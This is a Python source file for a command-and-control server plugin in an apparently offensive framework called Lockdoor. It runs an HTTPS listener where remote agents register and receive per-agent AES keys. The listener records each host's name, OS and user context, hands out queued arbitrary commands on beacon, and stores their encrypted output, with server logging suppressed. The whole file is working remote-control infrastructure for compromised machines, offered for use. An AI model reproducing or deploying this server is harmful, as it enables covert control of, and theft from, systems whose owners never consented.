import os
import ssl
import threading
import time # for timestamps
import uuid # for agent_id
from http.server import HTTPServer, BaseHTTPRequestHandler
import json # For C2 communication
import sqlite3 # Added for database
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64 # For encoding encrypted output

from src.plugin_framework_core.plugin_interface import LockdoorPlugin, Action, ActionParameter
from typing import List, Dict, Any, Optional


# Define the handler class before C2ManagerPlugin or ensure it's correctly scoped/passed.
class SimpleC2HTTPHandler(BaseHTTPRequestHandler):
    plugin_manager_ref: 'C2ManagerPlugin'

    def __init__(self, plugin_ref: 'C2ManagerPlugin', *args, **kwargs):
        self.plugin_manager_ref = plugin_ref
        super().__init__(*args, **kwargs)

    def _send_response(self, status_code, data=None, content_type='application/json'):
        self.send_response(status_code)
        self.send_header('Content-type', content_type)
        self.end_headers()
        if data:
            if isinstance(data, str):
                self.wfile.write(data.encode('utf-8'))
            else:
                self.wfile.write(json.dumps(data).encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_body_bytes = self.rfile.read(content_length)

        try:
            post_data = json.loads(post_body_bytes.decode('utf-8')) if post_body_bytes else {}
        except json.JSONDecodeError:
            self._send_response(400, {"error": "Invalid JSON data."})
            return

        client_ip, _ = self.client_address

        if self.path == '/register':
            initial_agent_data = post_data.get('initial_data', {})
            registration_result = self.plugin_manager_ref._handle_agent_registration(client_ip, initial_agent_data)

            if registration_result.get("status") == "success":
                response_payload = {
                    "agent_id": registration_result["agent_id"],
                    "encryption_key": registration_result["encryption_key_hex"], # Send hex key
                    "status": "registered"
                }
                self._send_response(200, response_payload)
                print(f"[C2 Listener] New agent registered: {registration_result['agent_id']} from {client_ip}")
            else:
                self._send_response(500, {"error": registration_result.get("message", "Agent registration failed on server.")})

        elif self.path == '/beacon':
            agent_id = post_data.get('agent_id')
            if not agent_id:
                self._send_response(400, {"error": "Missing agent_id in beacon."})
                return

            agent_info = self.plugin_manager_ref._db_get_agent(agent_id)
            if not agent_info or not agent_info.get('encryption_key'):
                self._send_response(403, {"error": "Agent not recognized or no encryption key available."})
                print(f"[C2 Listener] Beacon from unknown/keyless agent {agent_id}")
                return

            key_hex = agent_info['encryption_key']

            if self.plugin_manager_ref._handle_agent_beacon(agent_id, client_ip):
                command_details = self.plugin_manager_ref._handle_get_pending_command(agent_id)

                response_to_encrypt: Any
                if command_details: # This is a dict like {'id': command_id, 'command_text': text}
                    response_to_encrypt = {"command": command_details['command_text'], "id": command_details['command_id'], "status": "command_pending"}
                else:
                    response_to_encrypt = {"status": "no_command", "message": "beacon_received"}

                encrypted_response_data = self.plugin_manager_ref._encrypt_data(key_hex, response_to_encrypt)

                if encrypted_response_data:
                    self._send_response(200, {"data": encrypted_response_data}) # Send as {"data": "ENCRYPTED_STRING"}
                else:
                    # Log server-side error, agent will get a generic error or timeout
                    print(f"[C2 Listener] Failed to encrypt beacon response for agent {agent_id}")
                    self._send_response(500, {"error": "Server error during response encryption."})
            else:
                # This case should ideally be caught by the agent_info check above, but as a fallback:
                self._send_response(404, {"error": f"Agent {agent_id} not recognized or beacon update failed."})

        elif self.path == '/cmd_output':
            # Expected JSON: {"agent_id": "xxx", "encrypted_data": "BASE64_ENCRYPTED_OUTPUT_OBJ"}
            # Encrypted part is: {"command_id": "cmd123", "output": "..."}
            agent_id = post_data.get('agent_id')
            encrypted_data = post_data.get('encrypted_data')

            if not agent_id or not encrypted_data:
                self._send_response(400, {"error": "Missing agent_id or encrypted_data."})
                return

            agent_info = self.plugin_manager_ref._db_get_agent(agent_id)
            if not agent_info or not agent_info.get('encryption_key'):
                self._send_response(403, {"error": "Agent not found or no encryption key available."})
                print(f"[C2 Listener] CmdOutput from unknown/keyless agent {agent_id}")
                return

            key_hex = agent_info['encryption_key']
            decrypted_payload = self.plugin_manager_ref._decrypt_data(key_hex, encrypted_data)

            if decrypted_payload is None or not isinstance(decrypted_payload, dict):
                self._send_response(500, {"error": "Failed to decrypt or parse command output."})
                print(f"[C2 Listener] Failed decryption/parsing for agent {agent_id}. Payload: {encrypted_data[:50]}...")
                return

            command_id = decrypted_payload.get('command_id')
            output_text = decrypted_payload.get('output')

            if command_id is None or output_text is None: # output_text can be empty string
                self._send_response(400, {"error": "Decrypted payload missing command_id or output."})
                return

            if self.plugin_manager_ref._handle_store_command_output(agent_id, command_id, output_text):
                # Send encrypted ACK back
                ack_response = {"status": "output_received", "command_id": command_id}
                encrypted_ack = self.plugin_manager_ref._encrypt_data(key_hex, ack_response)
                if encrypted_ack:
                    self._send_response(200, {"data": encrypted_ack})
                else:
                    print(f"[C2 Listener] Failed to encrypt ACK for /cmd_output for agent {agent_id}")
                    self._send_response(500, {"error": "Server error encrypting ACK."}) # Agent got its data stored, but server failed to encrypt ACK.
            else:
                self._send_response(500, {"error": f"Failed to store command output for agent {agent_id}, command {command_id}."})
        else:
            self._send_response(404, {"error": "Endpoint not found."})

    def do_GET(self):
        if self.path == '/health':
            self._send_response(200, "Listener is alive.", content_type='text/plain')
        else:
            self._send_response(404, "Not Found.", content_type='text/plain')

    def log_message(self, format, *args):
        pass # Suppressed


class C2ManagerPlugin(LockdoorPlugin):
    def __init__(self):
        super().__init__()
        self.listener_thread: Optional[threading.Thread] = None
        self.listener_instance: Optional[HTTPServer] = None
        self.listener_status: str = "stopped"
        self.listener_host: str = "0.0.0.0"
        self.listener_port: int = 8443

        self.c2_certs_dir = "./c2_certs"
        self.keyfile = os.path.join(self.c2_certs_dir, "key.pem")
        self.certfile = os.path.join(self.c2_certs_dir, "cert.pem")

        self.data_dir = os.path.join(".", "data")
        self.db_path = os.path.join(self.data_dir, "c2_database.db")


    def _get_db_conn(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn

    def _init_db(self):
        conn = None
        try:
            conn = self._get_db_conn()
            cursor = conn.cursor()
            # Modified agents table
            cursor.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                agent_id TEXT PRIMARY KEY NOT NULL UNIQUE,
                registration_ip TEXT,
                first_seen REAL NOT NULL,
                last_seen REAL NOT NULL,
                hostname TEXT,
                os_info TEXT,
                user_context TEXT,
                status TEXT NOT NULL DEFAULT 'active',
                initial_data TEXT,
                encryption_key TEXT NOT NULL
            )''')
            cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                command_id TEXT PRIMARY KEY NOT NULL UNIQUE,
                agent_id TEXT NOT NULL,
                command_text TEXT NOT NULL,
                status TEXT NOT NULL DEFAULT 'pending_send',
                timestamp_created REAL NOT NULL,
                timestamp_sent REAL,
                timestamp_executed REAL,
                FOREIGN KEY(agent_id) REFERENCES agents(agent_id) ON DELETE CASCADE
            )''')
            cursor.execute('''
            CREATE TABLE IF NOT EXISTS command_outputs (
                output_id INTEGER PRIMARY KEY AUTOINCREMENT,
                command_id TEXT NOT NULL,
                output_text TEXT,
                timestamp_received REAL NOT NULL,
                FOREIGN KEY(command_id) REFERENCES commands(command_id) ON DELETE CASCADE
            )''')
            conn.commit()
            print("[C2 Manager] C2 Database initialized/verified (encryption_key column checked).")
        except sqlite3.Error as e:
            print(f"[C2 Manager] Error initializing C2 database: {e}")
            raise
        finally:
            if conn:
                conn.close()

    def _db_add_agent(self, agent_id: str, reg_ip: str, first_seen: float, last_seen: float,
                      hostname: Optional[str], os_info_str: Optional[str], user_context: Optional[str],
                      initial_data_json: Optional[str], encryption_key_hex: str, status: str = 'active') -> bool:
        # Modified SQL to include encryption_key
        sql = '''INSERT INTO agents (agent_id, registration_ip, first_seen, last_seen, hostname,
                                    os_info, user_context, initial_data, encryption_key, status)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'''
        conn = None
        try:
            conn = self._get_db_conn()
            cursor = conn.cursor()
            cursor.execute(sql, (agent_id, reg_ip, first_seen, last_seen, hostname,
                                  os_info_str, user_context, initial_data_json, encryption_key_hex, status))
            conn.commit()
            return True
        except sqlite3.Error as e:
            print(f"[C2 DB Error] Adding agent {agent_id}: {e}")
            return False
        finally:
            if conn:
                conn.close()

    def _handle_agent_registration(self, remote_ip: str, initial_agent_data: Dict) -> Dict:
        agent_id = uuid.uuid4().hex
        current_time = time.time()

        hostname = initial_agent_data.get('hostname')
        os_name = initial_agent_data.get('os')
        os_version = initial_agent_data.get('os_version')
        os_info_str = f"{os_name} ({os_version})" if os_name and os_version else (os_name if os_name else None)

        user_context = initial_agent_data.get('user')
        initial_data_json = json.dumps(initial_agent_data)

        try:
            # AESGCM.generate_key is indeed the correct method for cryptography library
            encryption_key_bytes = AESGCM.generate_key(bit_length=256) # 32 bytes AES key
            encryption_key_hex = encryption_key_bytes.hex()
        except Exception as e:
            print(f"[C2 Manager] Error generating encryption key: {e}")
            return {"status": "error", "message": "Failed to generate encryption key."}

        if self._db_add_agent(
            agent_id=agent_id,
            reg_ip=remote_ip,
            first_seen=current_time,
            last_seen=current_time,
            hostname=hostname,
            os_info_str=os_info_str,
            user_context=user_context,
            initial_data_json=initial_data_json,
            encryption_key_hex=encryption_key_hex,
            status='active'
        ):
            print(f"[C2 Manager] New agent {agent_id} registered with encryption key.")
            # Return the hex key, as this is what agent expects based on typical JSON comms
            return {"status": "success", "agent_id": agent_id, "encryption_key_hex": encryption_key_hex}
        else:
            print(f"[C2 Manager] Failed to register agent {agent_id} in DB.")
            return {"status": "error", "message": "Failed to store agent information."}

    def _db_get_agent(self, agent_id: str) -> Optional[Dict]:
        sql = "SELECT * FROM agents WHERE agent_id = ?"
        conn = None
        try:
            conn = self._get_db_conn()
            cursor = conn.cursor()
            cursor.execute(sql, (agent_id,))
            row = cursor.fetchone()
            # encryption_key column will be included if SELECT * is used and schema is updated
            return dict(row) if row else None
        except sqlite3.Error as e:
            print(f"[C2 DB Error] Getting agent {agent_id}: {e}")
            return None
        finally:
            if conn:
                conn.close()

    # --- Other methods (_handle_agent_beacon, execute_action, etc.) ---
    # These are largely the same as in the previous version, but shown for completeness of the file.
    # Ensure they are compatible with the data structures now coming from the DB.

    def _handle_agent_beacon(self, agent_id: str, remote_ip: str) -> bool:
        return self._db_update_agent_last_seen(agent_id, time.time(), remote_ip)

    def _handle_get_pending_command(self, agent_id: str) -> Optional[Dict]:
        commands = self._db_get_pending_commands_for_agent(agent_id)
        return commands[0] if commands else None

    def _handle_store_command_output(self, agent_id: str, command_id: str, output: str) -> bool:
        cmd_details = self._db_get_command(command_id)
        if not cmd_details or cmd_details['agent_id'] != agent_id:
            print(f"[C2 Manager] Invalid command_id {command_id} or agent_id mismatch for output.")
            return False
        return self._db_add_command_output(command_id, output, time.time())

    def get_name(self) -> str:
        return "C2 Manager"

    def get_description(self) -> str:
        return "Manages Command and Control (C2) listeners, agents, and basic operations (DB backed)."

    def get_actions(self) -> List[Action]:
        actions: List[Action] = [
            {
                'name': 'start_https_listener',
                'description': 'Starts the HTTPS C2 listener.',
                'parameters': [
                    ActionParameter(name='host', description='Host to bind (default: 0.0.0.0).', type='string', required=False),
                    ActionParameter(name='port', description='Port for listener (default: 8443).', type='integer', required=False)
                ]
            },
            {
                'name': 'stop_https_listener',
                'description': 'Stops the HTTPS C2 listener.',
                'parameters': []
            },
            {
                'name': 'get_listener_status',
                'description': 'Gets the current status of the C2 listener.',
                'parameters': []
            },
            {
                'name': 'list_registered_agents',
                'description': 'Lists all currently registered agents from database.',
                'parameters': []
            },
            {
                'name': 'get_agent_details',
                'description': 'Get details for a specific agent from database.',
                'parameters': [
                    ActionParameter(name='agent_id', description='The unique ID of the agent.', type='string', required=True)
                ]
            },
            {
                'name': 'send_command_to_agent',
                'description': 'Sends a command to a specific agent (queued in DB).',
                'parameters': [
                    ActionParameter(name='agent_id', description='The unique ID of the agent.', type='string', required=True),
                    ActionParameter(name='command', description='The command string to execute on the agent.', type='string', required=True)
                ]
            }
        ]
        return actions

    def execute_action(self, action_name: str, params: Dict[str, Any]) -> Any:
        if action_name == 'start_https_listener':
            if self.listener_thread and self.listener_thread.is_alive():
                return {"status": "error", "message": "Listener is already running."}
            if not os.path.exists(self.keyfile) or not os.path.exists(self.certfile):
                msg = f"SSL key file ({self.keyfile}) or cert file ({self.certfile}) not found."
                self.listener_status = "error_missing_certs"
                return {"status": "error", "message": msg}
            self.listener_host = params.get('host', self.listener_host)
            self.listener_port = params.get('port', self.listener_port)
            try:
                def handler_factory(*args, **kwargs):
                    return SimpleC2HTTPHandler(self, *args, **kwargs)
                self.listener_instance = HTTPServer((self.listener_host, self.listener_port), handler_factory)
                self.listener_instance.socket = ssl.wrap_socket(
                    self.listener_instance.socket, keyfile=self.keyfile, certfile=self.certfile, server_side=True)
                self.listener_thread = threading.Thread(target=self.listener_instance.serve_forever, daemon=True)
                self.listener_thread.start()
                self.listener_status = "running"
                return {"status": "success", "message": f"HTTPS C2 Listener started on {self.listener_host}:{self.listener_port}"}
            except Exception as e:
                self.listener_status = f"error_starting: {str(e)}"
                return {"status": "error", "message": str(e)}

        elif action_name == 'stop_https_listener':
            if not self.listener_instance or not (self.listener_thread and self.listener_thread.is_alive()):
                self.listener_status = "stopped"
                return {"status": "info", "message": "Listener was not running."}
            try:
                self.listener_instance.shutdown()
                self.listener_thread.join(timeout=5)
                self.listener_status = "stopped"
                self.listener_instance = None
                self.listener_thread = None
                return {"status": "success", "message": "HTTPS C2 Listener stopped."}
            except Exception as e:
                self.listener_status = f"error_stopping: {str(e)}"
                return {"status": "error", "message": str(e)}

        elif action_name == 'get_listener_status':
            return {"status": self.listener_status, "host": self.listener_host, "port": self.listener_port,
                    "thread_active": self.listener_thread.is_alive() if self.listener_thread else False,
                    "keyfile_exists": os.path.exists(self.keyfile), "certfile_exists": os.path.exists(self.certfile)}

        elif action_name == 'list_registered_agents':
            agents = self._db_list_agents()
            return agents

        elif action_name == 'get_agent_details':
            agent_id = params.get('agent_id')
            if not agent_id: return {"error": "agent_id parameter is required."}
            agent_info = self._db_get_agent(agent_id)
            if agent_info:
                agent_info = dict(agent_info)
                agent_info['command_history'] = self._db_get_command_history_for_agent(agent_id)
                # The encryption_key is present in agent_info, UI must decide not to show it.
                return agent_info
            return {"error": f"Agent with ID '{agent_id}' not found."}

        elif action_name == 'send_command_to_agent':
            agent_id = params.get('agent_id')
            command_text = params.get('command')
            if not agent_id or not command_text:
                return {"error": "agent_id and command parameters are required."}

            if not self._db_get_agent(agent_id):
                return {"error": f"Agent with ID '{agent_id}' not found."}

            command_id = uuid.uuid4().hex
            timestamp = time.time()
            if self._db_add_command(command_id, agent_id, command_text, timestamp):
                return {"status": "success", "message": f"Command '{command_text}' (ID: {command_id}) queued for agent {agent_id}.", "command_id": command_id}
            else:
                return {"status": "error", "message": "Failed to queue command in database."}
        else:
            return {"error": f"Action '{action_name}' not found in {self.get_name()}."}

    def load(self) -> None:
        print(f"Plugin '{self.get_name()}' loaded. Initializing C2 components.")
        if not os.path.exists(self.data_dir):
            try:
                os.makedirs(self.data_dir)
                print(f"[C2 Manager] Created data directory: {self.data_dir}")
            except OSError as e:
                print(f"[C2 Manager] Error creating data directory {self.data_dir}: {e}")

        self._init_db()

        if not os.path.exists(self.c2_certs_dir):
            try:
                os.makedirs(self.c2_certs_dir)
                print(f"[C2 Manager] Created directory: {self.c2_certs_dir}")
            except OSError as e:
                print(f"[C2 Manager] Error creating directory {self.c2_certs_dir}: {e}")
        if not os.path.exists(self.keyfile) or not os.path.exists(self.certfile):
            print(f"[C2 Manager] Reminder: SSL key/cert files ({self.keyfile}, {self.certfile}) not found.")
            print(f"[C2 Manager] Please generate them and place in {self.c2_certs_dir}.")
            print(f"[C2 Manager] Example: openssl req -x509 -newkey rsa:2048 -keyout {self.keyfile} -out {self.certfile} -days 365 -nodes -subj \"/CN=localhost\"")

    def unload(self) -> None:
        print(f"Plugin '{self.get_name()}' unloaded. Attempting to stop listener if running.")
        if self.listener_thread and self.listener_thread.is_alive():
            print("[C2 Manager] Listener is running. Attempting to stop...")
            if self.listener_instance:
                 try:
                    self.listener_instance.shutdown()
                    self.listener_thread.join(timeout=10)
                    if self.listener_thread.is_alive():
                        print("[C2 Manager] Warning: Listener thread did not terminate.")
                 except Exception as e:
                    print(f"[C2 Manager] Error during listener shutdown: {e}")
            self.listener_status = "stopped"
            self.listener_instance = None
            self.listener_thread = None
            print("[C2 Manager] Listener stopped process initiated.")
        else:
            print("[C2 Manager] Listener was not running or thread already finished.")

    # --- Full list of _db_* methods for clarity that they exist in the file ---
    def _db_list_agents(self) -> List[Dict]:
        sql = "SELECT * FROM agents"
        conn = None
        try:
            conn = self._get_db_conn()
            cursor = conn.cursor()
            cursor.execute(sql)
            rows = cursor.fetchall()
            return [dict(row) for row in rows]
        except sqlite3.Error as e:
            print(f"[C2 DB Error] Listing agents: {e}")
            return []
        finally:
            if conn:
                conn.close()

    def _db_update_agent_last_seen(self, agent_id: str, last_seen: float, remote_ip: Optional[str] = None) -> bool:
        sql = "UPDATE agents SET last_seen = ? WHERE agent_id = ?"
        params = (last_seen, agent_id)
        conn = None
        try:
            conn = self._get_db_conn()
            cursor = conn.cursor()
            cursor.execute(sql, params)
            conn.commit()
            return cursor.rowcount > 0
        except sqlite3.Error as e:
            print(f"[C2 DB Error] Updating agent {agent_id} last_seen: {e}")
            return False
        finally:
            if conn:
                conn.close()

    def _db_update_agent_status(self, agent_id: str, status: str) -> bool:
        sql = "UPDATE agents SET status = ? WHERE agent_id = ?"
        conn = None
        try:
            conn = self._get_db_conn()
            cursor = conn.cursor()
            cursor.execute(sql, (status, agent_id))
            conn.commit()
            return cursor.rowcount > 0
        except sqlite3.Error as e:
            print(f"[C2 DB Error] Updating agent {agent_id} status: {e}")
            return False
        finally:
            if conn:
                conn.close()

    def _db_add_command(self, command_id: str, agent_id: str, command_text: str, timestamp_created: float, status: str = 'pending_send') -> bool:
        sql = '''INSERT INTO commands (command_id, agent_id, command_text, timestamp_created, status)
                 VALUES (?, ?, ?, ?, ?)'''
        conn = None
        try:
            conn = self._get_db_conn()
            cursor = conn.cursor()
            cursor.execute(sql, (command_id, agent_id, command_text, timestamp_created, status))
            conn.commit()
            return True
        except sqlite3.Error as e:
            print(f"[C2 DB Error] Adding command {command_id} for agent {agent_id}: {e}")
            return False
        finally:
            if conn:
                conn.close()

    def _db_get_command(self, command_id: str) -> Optional[Dict]:
        sql = "SELECT * FROM commands WHERE command_id = ?"
        conn = None
        try:
            conn = self._get_db_conn()
            cursor = conn.cursor()
            cursor.execute(sql, (command_id,))
            row = cursor.fetchone()
            return dict(row) if row else None
        except sqlite3.Error as e:
            print(f"[C2 DB Error] Getting command {command_id}: {e}")
            return None
        finally:
            if conn:
                conn.close()

    def _db_get_pending_commands_for_agent(self, agent_id: str) -> List[Dict]:
        sql_get = "SELECT * FROM commands WHERE agent_id = ? AND status = 'pending_send' ORDER BY timestamp_created ASC LIMIT 1"
        conn = None
        try:
            conn = self._get_db_conn()
            cursor = conn.cursor()
            cursor.execute(sql_get, (agent_id,))
            row = cursor.fetchone()
            if row:
                command = dict(row)
                self._db_update_command_status(command['command_id'], 'sent_to_agent', time.time())
                return [command]
            return []
        except sqlite3.Error as e:
            print(f"[C2 DB Error] Getting pending commands for agent {agent_id}: {e}")
            return []
        finally:
            if conn:
                conn.close()

    def _db_update_command_status(self, command_id: str, status: str, timestamp_event: Optional[float] = None) -> bool:
        if status == 'sent_to_agent' and timestamp_event:
            sql = "UPDATE commands SET status = ?, timestamp_sent = ? WHERE command_id = ?"
            params = (status, timestamp_event, command_id)
        elif status == 'executed' and timestamp_event:
            sql = "UPDATE commands SET status = ?, timestamp_executed = ? WHERE command_id = ?"
            params = (status, timestamp_event, command_id)
        else:
            sql = "UPDATE commands SET status = ? WHERE command_id = ?"
            params = (status, command_id)

        conn = None
        try:
            conn = self._get_db_conn()
            cursor = conn.cursor()
            cursor.execute(sql, params)
            conn.commit()
            return cursor.rowcount > 0
        except sqlite3.Error as e:
            print(f"[C2 DB Error] Updating command {command_id} status to {status}: {e}")
            return False
        finally:
            if conn:
                conn.close()

    def _db_add_command_output(self, command_id: str, output_text: str, timestamp_received: float) -> bool:
        sql = '''INSERT INTO command_outputs (command_id, output_text, timestamp_received)
                 VALUES (?, ?, ?)'''
        conn = None
        try:
            conn = self._get_db_conn()
            cursor = conn.cursor()
            cursor.execute(sql, (command_id, output_text, timestamp_received))
            conn.commit()
            self._db_update_command_status(command_id, 'executed', timestamp_received)
            return True
        except sqlite3.Error as e:
            print(f"[C2 DB Error] Adding output for command {command_id}: {e}")
            return False
        finally:
            if conn:
                conn.close()

    def _db_get_outputs_for_command(self, command_id: str) -> List[Dict]:
        sql = "SELECT * FROM command_outputs WHERE command_id = ? ORDER BY timestamp_received ASC"
        conn = None
        try:
            conn = self._get_db_conn()
            cursor = conn.cursor()
            cursor.execute(sql, (command_id,))
            rows = cursor.fetchall()
            return [dict(row) for row in rows]
        except sqlite3.Error as e:
            print(f"[C2 DB Error] Getting outputs for command {command_id}: {e}")
            return []
        finally:
            if conn:
                conn.close()

    def _db_get_command_history_for_agent(self, agent_id: str) -> List[Dict]:
        sql = """
        SELECT
            c.command_id, c.agent_id, c.command_text, c.status,
            c.timestamp_created, c.timestamp_sent, c.timestamp_executed,
            (SELECT co.output_text FROM command_outputs co
             WHERE co.command_id = c.command_id
             ORDER BY co.timestamp_received ASC LIMIT 1) as output_text,
            (SELECT co.timestamp_received FROM command_outputs co
             WHERE co.command_id = c.command_id
             ORDER BY co.timestamp_received ASC LIMIT 1) as output_timestamp
        FROM commands c
        WHERE c.agent_id = ?
        ORDER BY c.timestamp_created DESC
        """
        conn = None
        try:
            conn = self._get_db_conn()
            cursor = conn.cursor()
            cursor.execute(sql, (agent_id,))
            rows = cursor.fetchall()
            return [dict(row) for row in rows]
        except sqlite3.Error as e:
            print(f"[C2 DB Error] Getting command history for agent {agent_id}: {e}")
            return []
        finally:
            if conn:
                conn.close()
# No other top-level executable code here.
